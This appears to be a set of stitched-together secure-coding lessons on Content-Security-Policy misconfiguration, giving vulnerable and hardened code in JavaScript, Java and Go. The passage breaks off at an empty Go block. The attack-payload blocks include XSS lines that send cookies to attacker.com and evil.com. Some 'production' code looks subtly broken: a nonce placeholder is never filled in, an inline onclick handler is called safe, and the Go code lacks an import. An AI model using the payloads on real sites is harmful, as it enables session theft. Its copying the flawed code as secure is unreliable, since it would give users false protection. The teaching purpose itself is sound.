Content-Security-Policy (CSP) is a critical defense against XSS attacks, but misconfigured CSP can provide a false sense of security while offering little to no protection. Let me show you a dangerous pattern that's unfortunately common.

**VULNERABLE CODE**:

```javascript
const express = require('express');
const app = express();

// DANGEROUS: Overly permissive CSP that defeats its purpose
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src *; " +
    "script-src * 'unsafe-inline' 'unsafe-eval'; " +
    "style-src * 'unsafe-inline'; " +
    "img-src * data: blob:; " +
    "font-src *; " +
    "connect-src *; " +
    "frame-src *;"
  );
  next();
});

app.get('/', (req, res) => {
  const userName = req.query.name || 'Guest';
  // Reflected XSS vulnerability - CSP won't protect!
  res.send(`
    <html>
      <head><title>Welcome</title></head>
      <body>
        <h1>Hello, ${userName}!</h1>
        <script>console.log('App loaded');</script>
      </body>
    </html>
  `);
});

app.listen(3000);
```

**Attack Payload**:
```html
?name=<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
```

**Why This Is Dangerous**:
- `unsafe-inline` allows ANY inline script to execute, defeating XSS protection entirely
- `unsafe-eval` allows `eval()`, `Function()`, and `setTimeout('string')` - common XSS vectors
- Wildcard `*` sources allow loading scripts from any domain, enabling injection of malicious external scripts
- `data:` URIs in img-src can be abused for data exfiltration via image requests
- This CSP is essentially useless - it blocks nothing meaningful

**SECURE VERSION**:

```javascript
const express = require('express');
const crypto = require('crypto');
const helmet = require('helmet');

const app = express();

// Generate unique nonce per request for inline scripts
app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString('base64');
  next();
});

// Strict CSP using helmet
app.use((req, res, next) => {
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: [
        "'self'",
        `'nonce-${res.locals.nonce}'`
      ],
      styleSrc: ["'self'", "https://fonts.googleapis.com"],
      imgSrc: ["'self'", "https://trusted-cdn.example.com"],
      fontSrc: ["'self'", "https://fonts.gstatic.com"],
      connectSrc: ["'self'", "https://api.example.com"],
      frameSrc: ["'none'"],
      objectSrc: ["'none'"],
      baseUri: ["'self'"],
      formAction: ["'self'"],
      frameAncestors: ["'none'"],
      upgradeInsecureRequests: []
    }
  })(req, res, next);
});

// Escape HTML to prevent XSS
function escapeHtml(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return text.replace(/[&<>"']/g, char => map[char]);
}

app.get('/', (req, res) => {
  const userName = escapeHtml(req.query.name || 'Guest');
  res.send(`
    <html>
      <head><title>Welcome</title></head>
      <body>
        <h1>Hello, ${userName}!</h1>
        <script nonce="${res.locals.nonce}">console.log('App loaded');</script>
      </body>
    </html>
  `);
});

app.listen(3000);
```

**Key Security Controls**:
- **Nonce-based script execution**: Only scripts with the correct per-request nonce can execute, blocking injected scripts
- **Explicit allowlist**: Each directive specifies exactly which sources are permitted - no wildcards
- **No unsafe-inline/unsafe-eval**: Eliminates the most common XSS bypass vectors
- **HTML escaping**: Defense in depth - even if CSP fails, XSS payload is neutralized
- **frameAncestors 'none'**: Prevents clickjacking attacks

Excellent question! Production CSP configuration requires balancing security with functionality, especially when integrating third-party services. Here's a comprehensive production-ready pattern.

**PRODUCTION PATTERN**:

```javascript
const express = require('express');
const crypto = require('crypto');
const helmet = require('helmet');
const winston = require('winston');

const app = express();

// Configure logging for CSP violations
const logger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),
  transports: [
    new winston.transports.File({ filename: 'csp-violations.log' })
  ]
});

// Environment-specific CSP configurations
const cspConfig = {
  development: {
    reportOnly: true,
    reportUri: '/api/csp-report'
  },
  staging: {
    reportOnly: true,
    reportUri: 'https://csp-report.example.com/staging'
  },
  production: {
    reportOnly: false,
    reportUri: 'https://csp-report.example.com/prod'
  }
};

const env = process.env.NODE_ENV || 'development';
const config = cspConfig[env];

// Trusted third-party domains - maintain strict allowlist
const trustedScriptSources = [
  "'self'",
  'https://www.googletagmanager.com',
  'https://www.google-analytics.com',
  'https://cdn.jsdelivr.net'
];

const trustedStyleSources = [
  "'self'",
  'https://fonts.googleapis.com',
  'https://cdn.jsdelivr.net'
];

const trustedConnectSources = [
  "'self'",
  'https://www.google-analytics.com',
  'https://api.example.com',
  'https://sentry.io'
];

// Generate cryptographically secure nonce per request
app.use((req, res, next) => {
  res.locals.cspNonce = crypto.randomBytes(32).toString('base64');
  next();
});

// Build CSP middleware with nonce support
const buildCspMiddleware = (req, res, next) => {
  const nonce = res.locals.cspNonce;

  const directives = {
    defaultSrc: ["'self'"],
    scriptSrc: [
      ...trustedScriptSources,
      `'nonce-${nonce}'`,
      "'strict-dynamic'"  // Allows nonce'd scripts to load additional scripts
    ],
    scriptSrcAttr: ["'none'"],  // Block inline event handlers
    styleSrc: [
      ...trustedStyleSources,
      `'nonce-${nonce}'`
    ],
    imgSrc: [
      "'self'",
      'https://www.google-analytics.com',
      'https://trusted-cdn.example.com',
      'data:'  // Only for specific use cases like base64 icons
    ],
    fontSrc: ["'self'", 'https://fonts.gstatic.com'],
    connectSrc: trustedConnectSources,
    frameSrc: ["'self'", 'https://www.youtube.com'],
    frameAncestors: ["'self'"],
    objectSrc: ["'none'"],
    baseUri: ["'self'"],
    formAction: ["'self'"],
    manifestSrc: ["'self'"],
    workerSrc: ["'self'", 'blob:'],
    upgradeInsecureRequests: []
  };

  // Add report-uri for violation monitoring
  if (config.reportUri) {
    directives.reportUri = [config.reportUri];
  }

  helmet.contentSecurityPolicy({
    directives,
    reportOnly: config.reportOnly
  })(req, res, next);
};

app.use(buildCspMiddleware);

// CSP violation reporting endpoint
app.post('/api/csp-report', express.json({ type: 'application/csp-report' }), (req, res) => {
  const violation = req.body['csp-report'];

  logger.warn('CSP Violation', {
    timestamp: new Date().toISOString(),
    documentUri: violation['document-uri'],
    violatedDirective: violation['violated-directive'],
    blockedUri: violation['blocked-uri'],
    sourceFile: violation['source-file'],
    lineNumber: violation['line-number'],
    userAgent: req.headers['user-agent'],
    ip: req.ip
  });

  // Alert on high-volume violations (potential attack)
  // Integration with monitoring system (Datadog, PagerDuty, etc.)

  res.status(204).end();
});

// Additional security headers
app.use(helmet({
  contentSecurityPolicy: false,  // We handle CSP separately
  crossOriginEmbedderPolicy: true,
  crossOriginOpenerPolicy: true,
  crossOriginResourcePolicy: { policy: 'same-site' },
  dnsPrefetchControl: { allow: false },
  frameguard: { action: 'deny' },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  },
  ieNoOpen: true,
  noSniff: true,
  originAgentCluster: true,
  permittedCrossDomainPolicies: { permittedPolicies: 'none' },
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
  xssFilter: true
}));

// Template helper for nonce injection
app.set('view engine', 'ejs');

app.get('/', (req, res) => {
  res.render('index', {
    nonce: res.locals.cspNonce,
    analyticsId: process.env.GA_TRACKING_ID
  });
});

// Health check endpoint for monitoring
app.get('/health', (req, res) => {
  res.json({
    status: 'healthy',
    cspMode: config.reportOnly ? 'report-only' : 'enforcing',
    environment: env
  });
});

app.listen(3000, () => {
  console.log(`Server running in ${env} mode`);
  console.log(`CSP mode: ${config.reportOnly ? 'Report-Only' : 'Enforcing'}`);
});
```

**Defense in Depth Layers**:

1. **Nonce-based script allowlisting with strict-dynamic**:
```javascript
// In your EJS/HTML template
<script nonce="<%= nonce %>">
  // This script will execute
  // Scripts it loads dynamically are also allowed via strict-dynamic
</script>

// Injected script without nonce - BLOCKED
<script>alert('XSS')</script>  // Will not execute
```

2. **Hash-based integrity for static scripts**:
```javascript
// For scripts that never change, use hash instead of nonce
const scriptHash = "'sha256-abc123...'";

scriptSrc: [
  "'self'",
  scriptHash,  // Only exact matching script content executes
  `'nonce-${nonce}'`
]
```

3. **Subresource Integrity (SRI) for CDN scripts**:
```html
<script 
  src="https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js"
  integrity="sha384-abc123def456..."
  crossorigin="anonymous"
  nonce="<%= nonce %>"></script>
```

**Additional Protections**:

- **Report-Only rollout**: Deploy CSP in report-only mode first to catch violations without breaking functionality, then switch to enforcing mode
- **Violation monitoring**: Aggregate CSP reports to detect attack attempts and misconfigurations; alert on sudden spikes
- **Gradual tightening**: Start with a broader policy, analyze reports, then progressively restrict sources
- **Separate CSP for different pages**: Admin pages can have stricter CSP than public pages
- **Feature-Policy/Permissions-Policy**: Complement CSP with feature restrictions:
```javascript
app.use((req, res, next) => {
  res.setHeader(
    'Permissions-Policy',
    'camera=(), microphone=(), geolocation=(self), payment=(self)'
  );
  next();
});
```

- **Regular CSP audits**: Use tools like `csp-evaluator.withgoogle.com` to validate your policy
- **Trusted Types**: For modern browsers, add Trusted Types to prevent DOM XSS:
```javascript
requireTrustedTypesFor: ["'script'"]
```

Content Security Policy (CSP) is critical for preventing XSS attacks, but many developers configure it incorrectly, essentially making it useless. The British Airways breach showed how attackers exploit weak CSP to inject payment card skimmers.

**VULNERABLE CODE**:

```java
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;

@Configuration
@EnableWebSecurity
public class SecurityConfig extends WebSecurityConfigurerAdapter {

    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http
            .headers()
                .contentSecurityPolicy(
                    // DANGEROUS: Allows scripts from anywhere!
                    "default-src *; " +
                    "script-src * 'unsafe-inline' 'unsafe-eval'; " +
                    "style-src * 'unsafe-inline'; " +
                    "img-src * data: blob:; " +
                    "connect-src *;"
                );
    }
}
```

**Attack Payload**:
```html
<script src="https://attacker.com/malicious.js"></script>
<script>
  // Inline script that steals data
  fetch('https://evil.com/steal?data=' + document.cookie);
</script>
```

**Why This Is Dangerous**:
- `script-src *` allows loading scripts from ANY domain, including attacker-controlled sites
- `'unsafe-inline'` permits inline scripts, enabling direct XSS execution
- `'unsafe-eval'` allows `eval()`, `Function()`, and other dangerous constructs
- `connect-src *` allows data exfiltration to any domain via fetch/XHR
- The CSP provides no protection - it's essentially disabled

**SECURE VERSION**:

```java
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;

@Configuration
@EnableWebSecurity
public class SecurityConfig extends WebSecurityConfigurerAdapter {

    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http
            .headers()
                .contentSecurityPolicy(
                    // Strict CSP - only allow trusted sources
                    "default-src 'self'; " +
                    "script-src 'self' https://cdn.trusted.com; " +
                    "style-src 'self' https://cdn.trusted.com; " +
                    "img-src 'self' https://images.trusted.com data:; " +
                    "font-src 'self' https://fonts.googleapis.com https://fonts.gstatic.com; " +
                    "connect-src 'self' https://api.myapp.com; " +
                    "frame-ancestors 'none'; " +
                    "form-action 'self'; " +
                    "base-uri 'self'; " +
                    "object-src 'none';"
                )
            .and()
                .frameOptions().deny()
            .and()
                .xssProtection().block(true);
    }
}
```

**Key Security Controls**:
- `default-src 'self'` - Only allow resources from same origin by default
- Explicit whitelisting of trusted CDNs for scripts and styles
- `frame-ancestors 'none'` - Prevents clickjacking attacks
- `object-src 'none'` - Blocks Flash and other plugin-based attacks
- `base-uri 'self'` - Prevents base tag injection attacks

For legacy code requiring inline scripts, use nonces or hashes instead of 'unsafe-inline'. Here's a production-ready implementation with reporting and monitoring.

**PRODUCTION PATTERN**:

```java
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.web.SecurityFilterChain;
import org.springframework.security.web.header.writers.ContentSecurityPolicyHeaderWriter;
import org.springframework.web.filter.OncePerRequestFilter;
import javax.servlet.FilterChain;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.security.SecureRandom;
import java.util.Base64;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

@Configuration
@EnableWebSecurity
public class ProductionSecurityConfig {

    private static final Logger securityLogger = LoggerFactory.getLogger("SECURITY_AUDIT");
    private static final SecureRandom secureRandom = new SecureRandom();

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .addFilterBefore(new CSPNonceFilter(), 
                org.springframework.security.web.header.HeaderWriterFilter.class)
            .headers(headers -> headers
                .contentSecurityPolicy(csp -> csp
                    .policyDirectives(buildCSPPolicy())
                )
                .frameOptions().deny()
                .httpStrictTransportSecurity(hsts -> hsts
                    .includeSubDomains(true)
                    .maxAgeInSeconds(31536000)
                    .preload(true)
                )
                .referrerPolicy(referrer -> referrer
                    .policy(org.springframework.security.web.header.writers.ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN)
                )
                .permissionsPolicy(permissions -> permissions
                    .policy("geolocation=(), microphone=(), camera=()")
                )
            );

        return http.build();
    }

    private String buildCSPPolicy() {
        return String.join("; ",
            "default-src 'self'",
            "script-src 'self' 'nonce-{NONCE}' https://cdn.trusted.com",
            "style-src 'self' 'nonce-{NONCE}' https://cdn.trusted.com",
            "img-src 'self' https://images.trusted.com data:",
            "font-src 'self' https://fonts.googleapis.com https://fonts.gstatic.com",
            "connect-src 'self' https://api.myapp.com",
            "frame-ancestors 'none'",
            "form-action 'self'",
            "base-uri 'self'",
            "object-src 'none'",
            "upgrade-insecure-requests",
            "report-uri /api/csp-violation-report",
            "report-to csp-endpoint"
        );
    }

    // Filter to generate and inject unique nonce per request
    public static class CSPNonceFilter extends OncePerRequestFilter {

        @Override
        protected void doFilterInternal(HttpServletRequest request, 
                                        HttpServletResponse response, 
                                        FilterChain filterChain) 
                                        throws java.io.IOException, javax.servlet.ServletException {

            // Generate cryptographically secure nonce
            byte[] nonceBytes = new byte[16];
            secureRandom.nextBytes(nonceBytes);
            String nonce = Base64.getEncoder().encodeToString(nonceBytes);

            // Store nonce in request for use in templates
            request.setAttribute("cspNonce", nonce);

            filterChain.doFilter(request, response);
        }
    }
}
```

```java
import org.springframework.web.bind.annotation.*;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import com.fasterxml.jackson.databind.JsonNode;
import javax.servlet.http.HttpServletRequest;

@RestController
@RequestMapping("/api")
public class CSPViolationController {

    private static final Logger securityLogger = LoggerFactory.getLogger("SECURITY_AUDIT");

    @PostMapping("/csp-violation-report")
    public void handleCSPViolation(@RequestBody JsonNode report,
                                   HttpServletRequest request) {

        JsonNode cspReport = report.get("csp-report");
        if (cspReport == null) {
            return;
        }

        String violatedDirective = getField(cspReport, "violated-directive");
        String blockedUri = getField(cspReport, "blocked-uri");
        String documentUri = getField(cspReport, "document-uri");
        String sourceFile = getField(cspReport, "source-file");
        String lineNumber = getField(cspReport, "line-number");
        String clientIp = request.getRemoteAddr();
        String userAgent = request.getHeader("User-Agent");

        // Log for SIEM/monitoring
        securityLogger.warn(
            "CSP_VIOLATION: directive={}, blocked={}, document={}, source={}:{}, ip={}, ua={}",
            violatedDirective, blockedUri, documentUri, 
            sourceFile, lineNumber, clientIp, userAgent
        );

        // Alert on potential attack patterns
        if (isHighRiskViolation(violatedDirective, blockedUri)) {
            securityLogger.error(
                "HIGH_RISK_CSP_VIOLATION: Possible XSS/injection attempt from ip={}",
                clientIp
            );
            // Trigger alerting (PagerDuty, Slack, etc.)
            alertSecurityTeam(clientIp, violatedDirective, blockedUri);
        }
    }

    private String getField(JsonNode node, String field) {
        JsonNode value = node.get(field);
        return value != null ? value.asText() : "unknown";
    }

    private boolean isHighRiskViolation(String directive, String blockedUri) {
        return directive.contains("script-src") && 
               !blockedUri.equals("inline") &&
               !blockedUri.startsWith("https://cdn.trusted.com");
    }

    private void alertSecurityTeam(String ip, String directive, String uri) {
        // Integration with alerting system
    }
}
```

**Using Nonces in Thymeleaf Templates**:

```html
<!DOCTYPE html>
<html xmlns:th="http://www.thymeleaf.org">
<head>
    <!-- Inline styles with nonce -->
    <style th:attr="nonce=${cspNonce}">
        .safe-style { color: blue; }
    </style>
</head>
<body>
    <!-- Inline script with nonce - required for legacy onclick handlers -->
    <script th:attr="nonce=${cspNonce}">
        function handleClick(element) {
            // Safe because nonce matches CSP
            console.log('Clicked:', element.id);
        }
    </script>

    <button id="btn1" onclick="handleClick(this)">Click Me</button>
</body>
</html>
```

**Defense in Depth Layers**:

1. **Nonce-based CSP**: Each request gets a unique cryptographic nonce, making it impossible for attackers to inject valid scripts
```java
byte[] nonceBytes = new byte[16];
secureRandom.nextBytes(nonceBytes);
String nonce = Base64.getEncoder().encodeToString(nonceBytes);
```

2. **CSP Violation Reporting**: Real-time visibility into blocked content and potential attacks
```java
"report-uri /api/csp-violation-report",
"report-to csp-endpoint"
```

3. **Additional Security Headers**: HSTS, X-Frame-Options, Referrer-Policy provide layered protection
```java
.httpStrictTransportSecurity(hsts -> hsts
    .includeSubDomains(true)
    .maxAgeInSeconds(31536000)
    .preload(true)
)
```

**Additional Protections**:
- Use `Content-Security-Policy-Report-Only` header during initial rollout to identify issues without breaking functionality
- Implement hash-based CSP for static inline scripts: `script-src 'sha256-abc123...'`
- Consider using Trusted Types API for DOM-based XSS prevention
- Regularly audit CSP policy using tools like Google's CSP Evaluator
- Set up dashboards in your SIEM to track CSP violation trends and detect attack campaigns

In production, you often need third-party resources while maintaining security. The key is using strict allowlists, hash-based integrity, and CSP reporting to detect bypass attempts.

**PRODUCTION PATTERN**:

```go
package main

import (
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"html/template"
	"io"
	"log"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

// CSPConfig holds Content-Security-Policy configuration
type CSPConfig struct {
	ReportURI       string
	TrustedScripts  []string // Allowlisted script domains
	TrustedStyles   []string // Allowlisted style domains
	TrustedImages   []string // Allowlisted image domains
	TrustedConnects []string // Allowlisted API endpoints
	ReportOnly      bool     // Use report-only mode for testing
}

// CSPViolation represents a CSP violation report
type CSPViolation struct {
	DocumentURI        string `json:"document-uri"`
	BlockedURI         string `json:"blocked-uri"`
	ViolatedDirective  string `json:"violated-directive"`
	EffectiveDirective string `json:"effective-directive"`
	OriginalPolicy     string `json:"original-policy"`
	SourceFile         string `json:"source-file"`
	LineNumber         int    `json:"line-number"`
	ColumnNumber       int    `json:"column-number"`
}

type CSPReport struct {
	CSPReport CSPViolation `json:"csp-report"`
}

// NonceStore manages per-request nonces with cleanup
type NonceStore struct {
	nonces map[string]time.Time
	mu     sync.RWMutex
}

func NewNonceStore() *NonceStore {
	ns := &NonceStore{nonces: make(map[string]time.Time)}
	go ns.cleanup()
	return ns
}

func (ns *NonceStore) Generate() (string, error) {
	b := make([]byte, 32)
	if _, err := rand.Read(b); err != nil {
		return "", err
	}
	nonce := base64.StdEncoding.EncodeToString(b)

	ns.mu.Lock()
	ns.nonces[nonce] = time.Now()
	ns.mu.Unlock()

	return nonce, nil
}

func (ns *NonceStore) cleanup() {
	ticker := time.NewTicker(5 * time.Minute)
	for range ticker.C {
		ns.mu.Lock()
		for nonce, created := range ns.nonces {
			if time.Since(created) > 10*time.Minute {
				delete(ns.nonces, nonce)
			}
		}
		ns.mu.Unlock()
	}
}

// ComputeSRIHash computes Subresource Integrity hash for external scripts
func ComputeSRIHash(content []byte) string {
	hash := sha256.Sum256(content)
	return "sha256-" + base64.StdEncoding.EncodeToString(hash[:])
}

// SecurityMiddleware applies comprehensive security headers
func SecurityMiddleware(config CSPConfig, nonceStore *NonceStore) func(http.Handler) http.Handler {
	return func(next http.Handler) http.Handler {
		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			// Generate unique nonce for this request
			nonce, err := nonceStore.Generate()
			if err != nil {
				log.Printf("ERROR: Failed to generate nonce: %v", err)
				http.Error(w, "Internal Server Error", http.StatusInternalServerError)
				return
			}

			// Build restrictive CSP with specific allowlists
			cspDirectives := []string{
				"default-src 'self'",
				fmt.Sprintf("script-src 'self' 'nonce-%s' 'strict-dynamic' %s", 
					nonce, strings.Join(config.TrustedScripts, " ")),
				fmt.Sprintf("style-src 'self' 'nonce-%s' %s", 
					nonce, strings.Join(config.TrustedStyles, " ")),
				fmt.Sprintf("img-src 'self' data: %s", 
					strings.Join(config.TrustedImages, " ")),
				fmt.Sprintf("connect-src 'self' %s", 
					strings.Join(config.TrustedConnects, " ")),
				"font-src 'self'",
				"object-src 'none'",
				"frame-ancestors 'none'",
				"base-uri 'self'",
				"form-action 'self'",
				"upgrade-insecure-requests",
			}

			if config.ReportURI != "" {
				cspDirectives = append(cspDirectives, 
					fmt.Sprintf("report-uri %s", config.ReportURI))
			}

			csp := strings.Join(cspDirectives, "; ")

			// Use Report-Only in staging for testing
			headerName := "Content-Security-Policy"
			if config.ReportOnly {
				headerName = "Content-Security-Policy-Report-Only"
			}
			w.Header().Set(headerName, csp)

			// Additional security headers
			w.Header().Set("X-Content-Type-Options", "nosniff")
			w.Header().Set("X-Frame-Options", "DENY")
			w.Header().Set("X-XSS-Protection", "0") // Disable legacy XSS filter
			w.Header().Set("Referrer-Policy", "strict-origin-when-cross-origin")
			w.Header().Set("Permissions-Policy", 
				"geolocation=(), microphone=(), camera=()")

			// HSTS for production
			if os.Getenv("ENV") == "production" {
				w.Header().Set("Strict-Transport-Security", 
					"max-age=31536000; includeSubDomains; preload")
			}

			// Store nonce in request context
			r = r.WithContext(contextWithNonce(r.Context(), nonce))

			next.ServeHTTP(w, r)
		})
	}
}

// CSP violation report handler for monitoring
func CSPReportHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(io.LimitReader(r.Body, 10240)) // Limit body size
	if err != nil {
		log.Printf("ERROR: Failed to read CSP report: %v", err)
		return
	}

	var report CSPReport
	if err := json.Unmarshal(body, &report); err != nil {
		log.Printf("ERROR: Failed to parse CSP report: %v", err)
		return
	}

	// Log violation for security monitoring (integrate with SIEM)
	log.Printf("SECURITY: CSP_VIOLATION blocked_uri=%s directive=%s document=%s source=%s:%d",
		report.CSPReport.BlockedURI,
		report.CSPReport.ViolatedDirective,
		report.CSPReport.DocumentURI,
		report.CSPReport.SourceFile,
		report.CSPReport.LineNumber)

	w.WriteHeader(http.StatusNoContent)
}

// Context helpers for nonce
type contextKey string
const nonceKey contextKey = "csp-nonce"

func contextWithNonce(ctx context.Context, nonce string) context.Context {
	return context.WithValue(ctx, nonceKey, nonce)
}

func NonceFromContext(ctx context.Context) string {
	nonce, _ := ctx.Value(nonceKey).(string)
	return nonce
}

func main() {
	config := CSPConfig{
		ReportURI: "/csp-report",
		TrustedScripts: []string{
			"https://cdn.jsdelivr.net",
			"https://www.google-analytics.com",
		},
		TrustedStyles: []string{
			"https://cdn.jsdelivr.net",
		},
		TrustedImages: []string{
			"https://cdn.example.com",
			"https://www.google-analytics.com",
		},
		TrustedConnects: []string{
			"https://api.example.com",
			"https://www.google-analytics.com",
		},
		ReportOnly: os.Getenv("ENV") != "production",
	}

	nonceStore := NewNonceStore()

	mux := http.NewServeMux()
	mux.HandleFunc("/csp-report", CSPReportHandler)
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		nonce := NonceFromContext(r.Context())

		tmpl := template.Must(template.New("page").Parse(`
<!DOCTYPE html>
<html>
<head>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5/dist/css/bootstrap.min.css"
          integrity="sha384-..." crossorigin="anonymous">
</head>
<body>
    <h1>Welcome, {{.Name}}</h1>
    <script nonce="{{.Nonce}}">
        // This inline script will execute (has valid nonce)
        console.log("Authorized inline script");
    </script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5/dist/js/bootstrap.bundle.min.js"
            integrity="sha384-..." crossorigin="anonymous"></script>
</body>
</html>`))

		tmpl.Execute(w, struct {
			Name  string
			Nonce string
		}{
			Name:  template.HTMLEscapeString(r.URL.Query().Get("name")),
			Nonce: nonce,
		})
	})

	handler := SecurityMiddleware(config, nonceStore)(mux)

	log.Println("Starting secure server on :8080")
	log.Fatal(http.ListenAndServe(":8080", handler))
}
```

**Defense in Depth Layers**:

1. **Nonce-based Script Allowlisting**:
```go
